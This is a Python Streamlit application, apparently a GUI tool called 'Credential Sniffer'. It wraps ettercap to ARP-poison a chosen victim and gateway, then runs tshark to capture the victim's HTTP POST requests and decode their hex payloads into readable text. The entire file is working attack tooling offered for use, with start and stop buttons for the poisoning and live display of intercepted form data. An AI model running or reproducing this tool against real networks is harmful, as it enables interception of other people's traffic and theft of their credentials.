import streamlit as st
import subprocess
import os
import signal
import shutil
import time
import re
import binascii

st.set_page_config(page_title="Credential Sniffer", page_icon="🕵️", layout="wide")

st.header("🕵️ Automated MitM & Credential Sniffer")
st.markdown("This module automates **ARP Poisoning** (Ettercap) while simultaneously running a **Packet Sniffer** (Tshark) to extract specific data matching your Wireshark filter.")

# --- DEPENDENCY CHECK ---
if not shutil.which("ettercap") or not shutil.which("tshark"):
    st.error("❌ Tools missing. Please run: `sudo apt install ettercap-text-only tshark`")
    st.stop()

# --- CONFIGURATION SIDEBAR ---
with st.sidebar:
    st.subheader("Network Configuration")
    interface = st.text_input("Interface", "wlan1")
    target_ip = st.text_input("Target IP (Victim)", "192.168.88.250")
    gateway_ip = st.text_input("Gateway IP (Router)", "192.168.88.252")
    
    st.subheader("Sniffer Settings")
    # This is the Wireshark Display Filter
    default_filter = f"ip.addr=={target_ip} && http.request.method==POST"
    wireshark_filter = st.text_area("Wireshark Filter", value=default_filter, height=100)

# --- SESSION STATE FOR BACKGROUND PROCESS ---
if "mitm_pid" not in st.session_state:
    st.session_state.mitm_pid = None

# --- SECTION 1: ATTACK CONTROL (ETTERCAP) ---
col1, col2 = st.columns([1, 2])

with col1:
    st.subheader("1. Attack Control")
    
    # Start Attack
    if st.button("☠️ Start ARP Poisoning"):
        if st.session_state.mitm_pid is not None:
            st.warning("Attack is already running!")
        else:
            # Command: sudo ettercap -T -q -i eth0 -M arp:remote /TARGET// /GATEWAY//
            cmd = [
                "ettercap", 
                "-T", "-q", 
                "-i", interface, 
                "-M", "arp:remote", 
                f"/{target_ip}//", 
                f"/{gateway_ip}//"
            ]
            
            # Start in background, silence output so it doesn't clutter UI
            proc = subprocess.Popen(
                cmd, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid # Create new session group to kill easily later
            )
            st.session_state.mitm_pid = proc.pid
            st.rerun()

    # Stop Attack
    if st.button("🛑 Stop Attack"):
        if st.session_state.mitm_pid:
            try:
                os.killpg(os.getpgid(st.session_state.mitm_pid), signal.SIGTERM)
                st.session_state.mitm_pid = None
                st.success("Attack stopped. ARP Cache restored.")
                st.rerun()
            except Exception as e:
                st.error(f"Error stopping process: {e}")
                st.session_state.mitm_pid = None
        else:
            st.info("No active attack found.")

    # Status Indicator
    if st.session_state.mitm_pid:
        st.error(f"🔥 POISONING ACTIVE (PID: {st.session_state.mitm_pid})")
        st.caption("Traffic is now being redirected through this machine.")
    else:
        st.success("🛡️ Network is Normal (Idle)")

# --- SECTION 2: SNIFFER OUTPUT (TSHARK) ---
with col2:
    st.subheader("2. Live Packet Filter")
    
    # UPDATED: Smart Regex-based Hex Decoder
    def try_decode_hex(line):
        """
        Scans the line for long Hex strings (like 7b22...) and replaces them 
        with their ASCII decoded text.
        """
        # Regex: Find a sequence of 20 or more Hex characters
        pattern = re.compile(r'([a-fA-F0-9]{20,})')
        
        def decode_match(match):
            hex_str = match.group(1)
            try:
                # Attempt to decode the hex string found
                decoded = binascii.unhexlify(hex_str).decode('utf-8')
                # Return the decoded text marked with green
                return f" 🟢 [DECODED]: {decoded} "
            except Exception:
                # If it fails (e.g. not valid utf-8), return original hex
                return hex_str

        # Replace all hex patterns found in the line with their decoded version
        return pattern.sub(decode_match, line)
        
    # We only allow sniffing if poisoning is active
    if st.session_state.mitm_pid:
        if st.button("👀 Start Sniffing Filtered Traffic"):
            st.info(f"Listening on {interface} with filter: `{wireshark_filter}`")
            
            # Placeholder for logs
            log_area = st.empty()
            logs = []
            
            # Tshark Command
            # -l: flush stdout immediately
            # -Y: Display Filter (The Wireshark filter)
            # -T fields: Print specific fields
            tshark_cmd = [
                "tshark",
                "-i", interface,
                "-l",                   # Flush output immediately
                "-Y", wireshark_filter, # Your filter
                "-T", "fields",
                "-e", "_ws.col.Time",   # Timestamp
                "-e", "ip.dst",         # NEW: Destination IP
                "-e", "tcp.dstport",    # NEW: Destination Port
                "-e", "_ws.col.Info",   # Request Info (POST /login...)
                "-e", "http.file_data"  # The payload (often Hex)
            ]
            
            try:
                process = subprocess.Popen(
                    tshark_cmd, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    text=True
                )
                
                # Loop to read output line by line
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break # Process ended
                        
                    line = line.strip()
                    if line:
                        # 1. Decode the Hex using the new Regex function
                        readable_line = try_decode_hex(line)
                        logs.append(readable_line)
                        
                        # 2. Display formatted log
                        # Show last 15 lines
                        log_area.code("\n".join(logs[-15:]), language="json")
                        
                        # Add a small sleep to prevent CPU spiking
                        time.sleep(0.01)
                    
            except Exception as e:
                st.error(f"Sniffer error: {e}")
            finally:
                # Cleanup if user stops script or switches page
                process.terminate()
    else:
        st.info("Start the ARP Poisoning attack first to redirect traffic.")
